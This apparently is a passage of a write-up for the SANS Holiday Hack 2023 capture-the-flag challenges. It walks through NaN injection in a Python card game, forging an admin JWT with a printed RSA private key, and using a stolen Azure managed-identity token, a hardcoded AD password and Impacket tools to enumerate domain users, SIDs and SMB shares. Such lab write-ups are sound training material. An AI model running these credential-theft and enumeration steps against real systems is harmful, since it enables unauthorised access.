success_message: "Your answer is *correct*!"
failure_message: "Sorry, that answer is *incorrect*. Please try again!"

# A prompt that is displayed if the user runs this interactively (they might
# not see this - answers can be entered as an argument)
prompt: "> "

# Optional: a time, in seconds, to delay before validating the answer (to
# prevent guessing)
delay: 1

# Optional: skip (most) stdout output if the answer is correct
headless: false

# If set to true, don't exit after the user asks
keep_going: false

# Optional: play this sound on completion or failure
#completion_sound: 'myhappysound.mp3'
#failure_sound: 'mysadsound.mp3'

# Close the terminal when it is completed?
```

Turns out the answer is **a case-sensitive "santa"**.

```
root@4020b9adad3f:/root# ./runmetoanswer santa
Your answer: santa

Checking....
Your answer is correct!
```

### Squarewheel Yard

#### Luggage-Lock

![Pasted image 20231210104707.png](Pasted%20image%2020231210104707.png)

Garland Candlesticks can't remember the combination to open his luggage lock.

> Watch Chris Elgee's talk, "[Lock Talk](https://www.youtube.com/watch?v=ycM1hBSEyog)".

Applying pressure on the keyhole button while rotating the combination will land us will, when landed on the the correct combo number, take additional force to move from.

This is not an easy challenge to screenshot and then display in a blog post, but the mechanics behind it can be explained.


### Tarnished Trove

#### Gameboy Cartridges Vol 1

I found _Elf The Dwarf's, Gloriously, Unfinished, Adventure! - Vol 1_ on the left side of Tarnished Trove, by the hat.

Loading up the game from the inventory and inspecting the source, it's running a Javascript-based gameboy ROM emulator. The ROM is sourced  from the path `rom/game.gb`.

![Pasted image 20231211212824.png](Pasted%20image%2020231211212824.png)

Analyzing the source code in the browser's dev console, there are keybinds being mapped that aren't mentioned at the top.

```js
bindKeys() {
    this.keyFuncs = {
      Backspace: this.keyRewind.bind(this),
      " ": this.keyPause.bind(this),
      "[": this.keyPrevPalette.bind(this),
      "]": this.keyNextPalette.bind(this),
    };

    if (customControls.down && customControls.down.length > 0) {
      customControls.down.forEach((k) => {
        this.keyFuncs[k] = this.setJoypDown.bind(this);
      });
    } else {
      this.keyFuncs["ArrowDown"] = this.setJoypDown.bind(this);
      this.keyFuncs["s"] = this.setJoypDown.bind(this);
    }

    if (customControls.left && customControls.left.length > 0) {
      customControls.left.forEach((k) => {
        this.keyFuncs[k] = this.setJoypLeft.bind(this);
      });
    } else {
      this.keyFuncs["ArrowLeft"] = this.setJoypLeft.bind(this);
      this.keyFuncs["a"] = this.setJoypLeft.bind(this);
    }

    if (customControls.right && customControls.right.length > 0) {
      customControls.right.forEach((k) => {
        this.keyFuncs[k] = this.setJoypRight.bind(this);
      });
    } else {
      this.keyFuncs["ArrowRight"] = this.setJoypRight.bind(this);
      this.keyFuncs["d"] = this.setJoypRight.bind(this);
    }

    if (customControls.up && customControls.up.length > 0) {
      customControls.up.forEach((k) => {
        this.keyFuncs[k] = this.setJoypUp.bind(this);
      });
    } else {
      this.keyFuncs["ArrowUp"] = this.setJoypUp.bind(this);
      this.keyFuncs["w"] = this.setJoypUp.bind(this);
    }

    if (customControls.a && customControls.a.length > 0) {
      customControls.a.forEach((k) => {
        this.keyFuncs[k] = this.setJoypA.bind(this);
      });w
    } else {
      this.keyFuncs["z"] = this.setJoypA.bind(this);
      this.keyFuncs["e"] = this.setJoypA.bind(this);
      this.keyFuncs["Alt"] = this.setJoypA.bind(this);
    }

    if (customControls.b && customControls.b.length > 0) {
      customControls.b.forEach((k) => {
        this.keyFuncs[k] = this.setJoypB.bind(this);
      });
    } else {
      this.keyFuncs["x"] = this.setJoypB.bind(this);
      this.keyFuncs["r"] = this.setJoypB.bind(this);
      this.keyFuncs["Control"] = this.setJoypB.bind(this);
    }

    if (customControls.start && customControls.start.length > 0) {
      customControls.start.forEach((k) => {
        this.keyFuncs[k] = this.setJoypStart.bind(this);
      });
    } else {
      this.keyFuncs["Enter"] = this.setJoypStart.bind(this);
    }

    if (customControls.select && customControls.select.length > 0) {
      customControls.select.forEach((k) => {
        this.keyFuncs[k] = this.setJoypSelect.bind(this);
      });
    } else {
      this.keyFuncs["Shift"] = this.setJoypSelect.bind(this);
    }

    this.boundKeyDown = this.keyDown.bind(this);
    this.boundKeyUp = this.keyUp.bind(this);

    window.addEventListener("keydown", this.boundKeyDown);
    window.addEventListener("keyup", this.boundKeyUp);
  }
```

| Function            | Key       | Gamepad Equivalent |
| ------------------- | --------- | ------------------ |
|                     | b         | b                  |
| Shift color pallete | \[        |                    |
| Shift color pallete | \]        |                    |
| Rewind              | Backspace |                    |

What's also interesting is that there is a "rewind" keybind set to **backspace**.

Upon jumping into the game...

The first challenge is a large QR code made of blocks, where 7 blocks are out of place, and you must "sing" (press CTRL) facing a block to highlight that a block is movable and it's intended location.

You can't immedately see that a block is out of place unless you use the square bracket keys (`[` and `]`) to scroll between the 84 color palletes where the default is `83` (index 84). **Color pallete _6_ will color the out-of-place blocks differently.**

Moving the blocks becomes a challenge, as some blocks' intended locations with wall off movement to another block's correct location. Luckily the `backspace` key (rewind function) comes in handy, but it's also slow and the buffer is small. There's a way to change these constants and make rewinding more useful.

```js
const REWIND_BUFFER_CAPACITY = 4 * 1024 * 1024;
const REWIND_FACTOR = 1.5;
const REWIND_UPDATE_MS = 16;
```

In Burp, I set the proxy to automatically match and replace certain constants in the response body. These variables are:
- `REWIND_BUFFER_CAPACITY`
- `REWIND_FACTOR`
- `REWIND_UPDATE_MS`

Which should allow for faster rewinds and a larger buffer. Clearing the browser cache and reloading the game will apply these changes.

![Pasted image 20231211205944.png](Pasted%20image%2020231211205944.png)

And now, when a mistake is made, it's much easier to revert our changes and correct it.

The block in the upper-left of the QR code presents a challenge: you can't see it's inteded location anywhere near it. After some thorough investigating, though, the intended location was on the complete opposite side of the QR code.

![Pasted image 20231211211757.png](Pasted%20image%2020231211211757.png)
```
http://8bitelf.com/
```

Which responds with:

```
flag:santaconfusedgivingplanetsqrcode
```

#### Gameboy Cartridges Vol 2

There's no indication I've seen suggesting another cartridge is located anywhere in the map.

## Film Noir Island

### Chiaroscuro City

#### Na'an

Shift McShuffles made a card game in Python and challenged us to play him. The game is simple: pick 5 numbers and Shifty will too, then you reveal your cards at the same time. Whoever picks the lowest and highest numbers gets a point for each, but if Shifty and you both pick the same number, that number is cancelled out.

Shifty says he doesn't cheat...

Playing the game, you would've found that Shifty always wins, or at minimum ties, which guarantees him at least 1 point every turn.

![Pasted image 20231213194226.png](Pasted%20image%2020231213194226.png)

![Pasted image 20231213194256.png](Pasted%20image%2020231213194256.png)

After analyzing the code, there was a validation function whose regex didn't quite look right.

```js
function IsValid(text) {
    return Boolean(text.match(/^[n0-9][na]{0,2}$/ig))
}
```

`^[n0-9][na]{0,2}$`

An explanation of how this regular expression works:
![Pasted image 20231213194524.png](Pasted%20image%2020231213194524.png)

So basically, the following "numbers" will also pass the validation check.

- `n`
- `nn`
- `nnn`
- `nna`
- `naa`
- `naa`
- `na`
- `1a`
- `1n`
- `1aa`
- ...

Playing any of these on Shifty causes an error to appear in the game's background, and some of the backend's code dumped in the HTTP response:
```python
Error in function named play_cards:

def play_cards(csv_card_choices, request_id):
  try:
    f = StringIO(csv_card_choices)
    reader = csv.reader(f, delimiter=',')
    player_cards = []
    for row in reader:
      for n in row:
        n = float(n)
        if is_valid_whole_number_choice(n) and n not in [x['num'] for x in player_cards]:
          player_cards.append({
            'owner':'p',
            'num':n
          })
      break
    if len(player_cards) != 5:
      return jsonify({"request":False,"data": f"Requires 5 unique values but was given "{csv_card_choices}"" })
    player_cards = sorted(player_cards, key=lambda d: d['num'])
    shiftys_cards = shifty_mcshuffles_choices( player_cards )
    all_cards = []
    for p in player_cards:
      if p['num'] not in [x['num'] for x in shiftys_cards]:
        all_cards.append(p)
    for s in shiftys_cards:
      if s['num'] not in [x['num'] for x in player_cards]:
        all_cards.append(s)
    maxItem = False
    minItem = False
    if bool(len(all_cards)):
      maxItem = max(all_cards, key=lambda x:x['num'])
      minItem = min(all_cards, key=lambda x:x['num'])
    p_starting_value = int(session.get('player',0))
    s_starting_value = int(session.get('shifty',0))
    if bool(maxItem):
      if maxItem['owner'] == 'p':
        session['player'] = str( p_starting_value + 1 )
      else:
        session['shifty'] = str( s_starting_value + 1 )
    if bool(minItem):
      if minItem['owner'] == 'p':
        session['player'] = str( int(session.get('player',0)) + 1 )
      else:
        session['shifty'] = str( int(session.get('shifty',0)) + 1 )
    score_message, win_lose_tie_na = win_lose_tie_na_calc( int(session.get('player',0)), int(session.get('shifty',0)) )
    play_message = 'Ha, we tied!'
    if int(session['player']) - p_starting_value > int(session['shifty']) - s_starting_value:
      play_message = 'Darn, how did I lose that hand!'
    elif int(session['player']) - p_starting_value < int(session['shifty']) - s_starting_value:
      play_message = 'I win and you lose that hand!'
    if win_lose_tie_na in ['w','l','t']:
      session['player'] = '0'
      session['shifty'] = '0'
    msg = { "request":True, "data": {
      'player_cards':player_cards,
      'shiftys_cards':shiftys_cards,
      'maxItem':maxItem,
      'minItem':minItem,
      'player_score':int(session['player']),
      'shifty_score':int(session['shifty']),
      'score_message': score_message,
      'win_lose_tie_na': win_lose_tie_na,
      'play_message':play_message,
    } }
    if win_lose_tie_na == "w":
      msg["data"]['conduit'] = { 'hash': hmac.new(submissionKey.encode('utf8'), request_id.encode('utf8'), sha256).hexdigest(), 'resourceId': request_id }
    return jsonify( msg )
  except Exception as e:
    err = f"{type(e).__name__} at line {e.__traceback__.tb_lineno} of {__file__}: {e}"
    raise ValueError(err)


ValueError at line 172 of /root/webserver/webserver.py: ValueError at line 97 of /root/webserver/webserver.py: could not convert string to float: 'na'
```

The trick is something called NaN (Not-A-Number) injection in Python.

![Pasted image 20231213204104.png](Pasted%20image%2020231213204104.png)

![Pasted image 20231213204114.png](Pasted%20image%2020231213204114.png)

Repeating that play 5 times wins you the game.

#### KQL Kraken Hunt

Tangle Coalbox has a case of network infection on the island and requires our expertise. He says someone clicked a phishing link and it's quickly getting out of hand. He says we will be using Azure Data Explorer and KQL to investigate.



## Steampunk Island

### Brass Buoy Port

#### Faster Combination

Bow Ninecandle needs to access to lavatory, for reasons, but it's protected with a combination padlock.

Combination padlocks can be unlocked by looking for the _sticky number_ and the two _guess numbers_ as explained in [# Close Up On How To Decode A Dial Combination Lock In 8 Attempts Or Less](https://www.youtube.com/watch?v=27rE5ZvWLU0).

Sticky: 25
Guess 1: 
Guess 2: 

#### The Captain's Comms

Chimney Scissorsticks says the captain is playing with a new SDR using some "fancy" JWT technology to control access, and they have a knack for shortening words using some abbreviation trick.

1. Find the planned "go-date" and "go-time" and radio frequency they plan to use.
2. Recreate an administrative JWT value to successfully transmit.

![Pasted image 20231210152313.png](Pasted%20image%2020231210152313.png)

![Pasted image 20231210152744.png](Pasted%20image%2020231210152744.png)

![Pasted image 20231210155328.png](Pasted%20image%2020231210155328.png)
- The private key is stored in a folder.
- A `keys` subfolder exists within the same folder the `roleMonitor` token resides, and the captain's public key `capsPubKey.key` is there aswell.
- The captain believes they restricted the private/public key file permissions to the minimum necessary.

There are also 3 volumes of owner's manuals sitting atop of the bookshelf. Reading them, we find:
- Access control is based on the ROLE that is CLAIMed in unique AUTHORIZATION tokens.
- BEARERs of tokens with different ROLEs permitted to use the SDR in different ways.
- Hiearchy of roles:
	1. `radioUser`: simply just running the software
	2. `radioMonitor`: listen to transmissions, given on the OWNER's CARD
	3. `radioDecoder`: decoding messages
	4. _Uniquely-named administrator role_: use the TRANSMITTER
- Very important to protect and store the special KEYs in FOLDERS which may be accessed only by authorized personnel.
- If KEYs are gained access to, unauthorized users may generate their own copy of the unique admin token.

> It's possible that the uniquely named admin role is `GeeseIslandsSuperChiefCommunicationsOfficer` as mentioned in the captain's journal found on Pixel Island.

> I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.

> Web Interception proxies like [Burp](https://portswigger.net/burp) and [Zap](https://www.zaproxy.org) make web sites fun!

> I've seen the Captain with [his Journal](https://elfhunt.org/static/images/captainsJournal.png]] visiting Pixel Island!

> A great introduction to JSON Web Tokens is available from [Auth0](https://jwt.io/introduction).

> Find a private key, update an existing JWT!

Using Firefox's (or any browser) developer console, a GET request to `/checkRole` can be seen when we try to view the computer screen. No data is sent with this request other than the cookies `CaptainsCookie` and `justWatchThisRole`.

Those cookies are JWTs, which can be decoded in parts.

`CaptainsCookie[1]`:
```json
{
	"captainsVictory": 0,
	"userid": "72a0a932-4e36-47ef-b5d5-57a0294d79c4"
}
```

`justWatchThisRole[1]`:
```json
{
	"iss": "HHC 2023 Captain's Comms",
	"iat": 1699485795.3403327,
	"exp": 1809937395.3403327,
	"aud": "Holiday Hack 2023",
	"role": "radioUser"
}
```

The `justWatchThisRole` is stored as a cookie and sent in the `Authorization` header for every access request.

![Pasted image 20231210152726.png](Pasted%20image%2020231210152726.png)

This is the owner's card mentioned above. Using the information here, by capturing a GET request to `/checkRole` using Burp  to `/jwtDefault/rMonitor.tok`

![Pasted image 20231210195358.png](Pasted%20image%2020231210195358.png)

Taking note of the response, which is the JWT for the `rMonitor` role, then modifying the `Authorization` after intercepting the request to use the SDR gained us access. But since our role is just `rMonitor`, attempting to decode the signals was unsuccessful.

Since I now know the directory where the `rMonitor` token resides, the captain wrote down the location of his public key under the same directory (`/jwtDefault/keys/capsPubKey.key`).

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Another request made using the newly received `rMonitor` JWT to `/jwtDefault/rDecoder.tok` was successful! This returned the auth token for `rDecoder`. The same interception process was repeated when viewing the signal decoding screen.

The `CW` signal decoded as morse code:

![Pasted image 20231210200634.png](Pasted%20image%2020231210200634.png)

```
CQ CQ CQ DE KH644 -- SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R
```

The next signal (`NUM`) was audio-text (like the Lincolnshire Poacher).

![Pasted image 20231210200821.png](Pasted%20image%2020231210200821.png)

These could possibly be UNIXs epochs in seconds.

```
88323: 1 days, 0 hours, 32 minutes and 3 seconds
16009: 4 hours, 26 minutes and 49 seconds
12249: 3 hours, 24 minutes and 9 seconds
```

And finally the last signal to decode is `FX`, or RadioFax, and an image.

![Pasted image 20231210202534.png](Pasted%20image%2020231210202534.png)

```
10426Hz (10.426kHz)
```

Now I have all the information needed but the captain's private key. Once the private key is obtained, the administrator token can be generated. After some guesswork, the private key was located at `/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key` following the same naming conventions as the public key.

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----
```

There is a plugin for Burp Suite called JWT Editor that allows you to easily inspect, manipulate, sign, and verify JWTs.

A legitimate JWT for the `radioDecoder` is successfully verified using the captain's private key. That means this private key is being used to sign for all JWTs, and that means I can sign for JWTs I create.

![Pasted image 20231210222239.png](Pasted%20image%2020231210222239.png)

Changing the `role` key of the JWT payload to the suspected role name for the administrator (`GeeseIslandsSuperChiefCommunicationsOfficer`) and signing using that private key is all that's needed.

Intercepting the request to transmit and modifying the `Authorization` header like that was previously done for both monitoring and decoding allowed access to the radio transmitter. Here, the frequency, go-date, and go-time can be added.

Since the last integer in each string is useless, the go-date seems to be 1224 (12/24) as it fits the situation perfectly (Christmas Eve), and the go-time is 1600. But we need to deceive the enemies into arriving 4 hours prior when the authorities will be ready to intercept them, so our transmitted go-time will be 1200.

**Frequency**: `10426`
**Go-Date**: `1224`
**Go-Time**: `1200`

![Pasted image 20231211165817.png](Pasted%20image%2020231211165817.png)



### Coggoggle Marina
#### Active Directory

Ribb Bonbowford talks about how Alabaster deployed an unchecked Azure function app generated by ChatNPT to a production environment alongside Azure AD and file shares. This concerns him as there are sensitive files stored in those shares.

He says that Alabaster's SSH account, that we have access to from a previous challenge, already gives me access to the Azure environment.

Connecting with the same SSH private key and SSH certificate with the `admin` principal from **Certificate SSHenanigans**, an `impacket` directory is found under the home directory. I also requested a new access token for `https://mangement.azure.com/` using the Azure Metadata Service API.

![Pasted image 20231223015841.png](Pasted%20image%2020231223015841.png)

```json
{
  "access_token": "...",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "85757",
  "expires_on": "1703725408",
  "ext_expires_in": "86399",
  "not_before": "1703638708",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

List key vaults

```sh
curl -H "Authorization: Bearer $AUTH" 'https://management.azure.com/subscriptions/$SUBID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01'
```
```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-10-30T13:17:02.532Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-10-30T13:17:02.532Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "Standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [],
        "enabledForDeployment": false,
        "enabledForDiskEncryption": false,
        "enabledForTemplateDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "enableRbacAuthorization": true,
        "vaultUri": "https://northpole-it-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-11-12T01:47:13.059Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-11-12T01:50:52.742Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "0bc7ae9d-292d-4742-8830-68d12469d759",
            "permissions": {
              "keys": [
                "all"
              ],
              "secrets": [
                "all"
              ],
              "certificates": [
                "all"
              ],
              "storage": [
                "all"
              ]
            }
          },
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "1b202351-8c85-46f1-81f8-5528e92eb7ce",
            "permissions": {
              "secrets": [
                "get"
              ]
            }
          }
        ],
        "enabledForDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "vaultUri": "https://northpole-ssh-certs-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    }
  ],
  "nextLink": "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&$skiptoken=bm9ydGhwb2xlLXJnMXxub3J0aHBvbGUtc3NoLWNlcnRzLWt2"
}
```

Enumerate key vault `northpole-it-kv`

```sh
-$ curl -H "Authorization: Bearer $AUTH" 'https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4' | jq
```

The value of the only secret shown was a Powershell script exposing the password for user `northpole.local/elfy` in hardcoded variables.

```powershell
Import-Module ActiveDirectory;
$UserName = "elfy";
$UserDomain = "northpole.local";
$UserUPN = "$UserName@$UserDomain";
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
$DCIP = "10.0.0.53";
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru;
```

A few facts can be derived from the script.
1. The domain is `northpole.local`.
2. User `elfy` exists and their password in plaintext.
3. The domain controller has IP `10.0.0.53`.

This is a gateway into the Active Directory environment paired with the existence of Impacket in the home direct of `alabaster` on machine `ssh-server-vm`. This secret can be retrieved from any Azure Virtual Machine capable of contacting the Azure Metadata API and assigned a "system-assigned identity" in the Azure environment.

The command below can retrieve all domain useraccounts.

```bash
~$ ./GetADUsers.py -dc-ip '10.0.0.53' 'northpole.local/elfy:J4`ufC49/J4766' -debug -all
```
```
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/alabaster/.venv/lib/python3.11/site-packages/impacket
[+] Connecting to 10.0.0.53, port 389, SSL False
[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
[+] Search Filter=(&(sAMAccountName=*)(objectCategory=user))
alabaster                                             2023-12-29 01:03:22.070363  2023-12-29 03:01:55.768279
Guest                                                 <never>              <never>
krbtgt                                                2023-12-29 01:10:34.023988  <never>
elfy                                                  2023-12-29 01:13:03.374053  2023-12-29 04:23:19.828355
wombleycube                                           2023-12-29 01:13:03.467812  2023-12-29 04:18:36.358082
```

SMB sessions can be established as the `elfy` useraccount and shares can be enumerated. The `FileShare` share allows `elfy` to connect and read `todo.txt` and other files. The subfolder `super_secret_research` does not allow `elfy` access.

```bash
~$ ./smbclient.py -dc-ip '10.0.0.53' 'northpole.local/elfy:J4`ufC49/J4766@10.0.0.53'
```
```
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL

# use FileShare
# ls
drw-rw-rw-          0  Fri Dec 29 01:13:59 2023 .
drw-rw-rw-          0  Fri Dec 29 01:13:56 2023 ..
-rw-rw-rw-     701028  Fri Dec 29 01:13:58 2023 Cookies.pdf
-rw-rw-rw-    1521650  Fri Dec 29 01:13:58 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Fri Dec 29 01:13:59 2023 SignatureCookies.pdf
drw-rw-rw-          0  Fri Dec 29 01:13:59 2023 super_secret_research
-rw-rw-rw-        165  Fri Dec 29 01:13:59 2023 todo.txt

# cat todo.txt
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit

# ls super_secret_research
<nothing>
```

Domain SIDs can also be enumerated with Impacket's `lookupsid` module.

```bash
~$ ./lookupsid.py 'northpole.local/elfy:J4`ufC49/J4766@10.0.0.53'
```
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.0.0.53
[*] StringBinding ncacn_np:10.0.0.53[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1387884557-1616550563-3537715981
498: NORTHPOLE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NORTHPOLE\alabaster (SidTypeUser)
501: NORTHPOLE\Guest (SidTypeUser)
502: NORTHPOLE\krbtgt (SidTypeUser)
512: NORTHPOLE\Domain Admins (SidTypeGroup)
513: NORTHPOLE\Domain Users (SidTypeGroup)
514: NORTHPOLE\Domain Guests (SidTypeGroup)
515: NORTHPOLE\Domain Computers (SidTypeGroup)
516: NORTHPOLE\Domain Controllers (SidTypeGroup)
517: NORTHPOLE\Cert Publishers (SidTypeAlias)
518: NORTHPOLE\Schema Admins (SidTypeGroup)
519: NORTHPOLE\Enterprise Admins (SidTypeGroup)
520: NORTHPOLE\Group Policy Creator Owners (SidTypeGroup)
521: NORTHPOLE\Read-only Domain Controllers (SidTypeGroup)
522: NORTHPOLE\Cloneable Domain Controllers (SidTypeGroup)
525: NORTHPOLE\Protected Users (SidTypeGroup)
526: NORTHPOLE\Key Admins (SidTypeGroup)
527: NORTHPOLE\Enterprise Key Admins (SidTypeGroup)
553: NORTHPOLE\RAS and IAS Servers (SidTypeAlias)
571: NORTHPOLE\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTHPOLE\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTHPOLE\npdc01$ (SidTypeUser)
1101: NORTHPOLE\DnsAdmins (SidTypeAlias)
1102: NORTHPOLE\DnsUpdateProxy (SidTypeGroup)
1103: NORTHPOLE\researchers (SidTypeGroup)
1104: NORTHPOLE\elfy (SidTypeUser)
1105: NORTHPOLE\wombleycube (SidTypeUser)
```

The Security Account Management Remote interface can be communicated with over MSRPC to retrieve more verbose information from the domain.

```bash
~$ ./samrdump.py 'northpole.local/elfy:J4`ufC49/J4766@10.0.0.53'
```
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.0.0.53
Found domain(s):
 . NORTHPOLE
 . Builtin
[*] Looking up users in domain NORTHPOLE
Found user: alabaster, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: elfy, uid = 1104
Found user: wombleycube, uid = 1105
alabaster (500)/FullName:
alabaster (500)/UserComment:
alabaster (500)/PrimaryGroupId: 513
alabaster (500)/BadPasswordCount: 0
alabaster (500)/LogonCount: 12
alabaster (500)/PasswordLastSet: 2023-12-29 01:03:22.070363
alabaster (500)/PasswordDoesNotExpire: False
alabaster (500)/AccountIsDisabled: False
alabaster (500)/ScriptPath:
Guest (501)/FullName:
Guest (501)/UserComment:
Guest (501)/PrimaryGroupId: 514
Guest (501)/BadPasswordCount: 0
Guest (501)/LogonCount: 0
Guest (501)/PasswordLastSet: <never>
Guest (501)/PasswordDoesNotExpire: True
Guest (501)/AccountIsDisabled: True
Guest (501)/ScriptPath:
krbtgt (502)/FullName:
krbtgt (502)/UserComment:
krbtgt (502)/PrimaryGroupId: 513
krbtgt (502)/BadPasswordCount: 0
krbtgt (502)/LogonCount: 0
krbtgt (502)/PasswordLastSet: 2023-12-29 01:10:34.023988
krbtgt (502)/PasswordDoesNotExpire: False
krbtgt (502)/AccountIsDisabled: True
krbtgt (502)/ScriptPath:
elfy (1104)/FullName:
elfy (1104)/UserComment:
elfy (1104)/PrimaryGroupId: 513
elfy (1104)/BadPasswordCount: 0
